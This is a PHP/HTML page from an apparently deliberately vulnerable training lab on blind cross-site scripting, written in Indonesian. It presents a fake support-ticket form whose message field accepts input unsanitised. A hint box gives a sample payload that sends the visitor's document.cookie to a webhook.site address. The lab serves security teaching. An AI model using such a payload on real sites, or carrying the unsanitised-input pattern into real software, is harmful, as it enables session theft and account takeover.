<?php
session_start();
include '../../config/db.php';
include '../../core/auth.php';

if (isset($_POST['submit_ticket'])) {
    $subject = $_POST['subject'];
    $message = $_POST['message']; // Payload masuk ke sini

    // Simulasi penyimpanan ke tabel log/admin (tidak ditampilkan di sini)
    // Dalam realita, data ini akan muncul di dashboard admin.
    $success = "Tiket Anda telah dikirim ke Admin ADR Group. Mohon tunggu balasan.";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Blind XSS Lab | mrahmatt74 Security</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../../public/assets/xss.css">
</head>
<body>

<div class="container">
    <div class="header">
        <h2><i class="fas fa-user-secret"></i> Blind XSS Lab</h2>
        <a href="../../index.php" class="btn-back"><i class="fas fa-arrow-left"></i> Dashboard</a>
    </div>

    <div class="card">
        <p>Gunakan form ini untuk melaporkan masalah teknis kepada administrator sistem.</p>

        <?php if (isset($success)): ?>
            <div style="padding:15px; background:#e8f5e9; color:#2e7d32; border-radius:8px; margin-bottom:20px;">
                <?= $success ?>
            </div>
        <?php endif; ?>

        <form method="POST">
            <input type="text" name="subject" placeholder="Subjek Masalah" required 
                   style="width:100%; padding:12px; border:2px solid #eee; border-radius:8px; margin-bottom:15px;">
            <textarea name="message" placeholder="Jelaskan detail masalah Anda..." required 
                      style="width:100%; height:120px; padding:12px; border:2px solid #eee; border-radius:8px; margin-bottom:15px;"></textarea>
            <button type="submit" name="submit_ticket" style="background:#285A48; color:white; border:none; padding:12px 25px; border-radius:8px; cursor:pointer; width:100%;">
                Kirim ke Admin
            </button>
        </form>

        <div class="payload-hint">
            <strong>Lab Objective:</strong><br>
            Karena Anda tidak bisa melihat dashboard admin, gunakan <strong>XSS Hunter</strong> atau <strong>Webhook.site</strong> untuk menerima kiriman data.<br>
            Contoh payload pencurian data otomatis:<br>
            <code>&lt;script&gt;fetch('https://webhook.site/your-id?cookie=' + document.cookie);&lt;/script&gt;</code>
        </div>
    </div>
</div>
</body>
</html>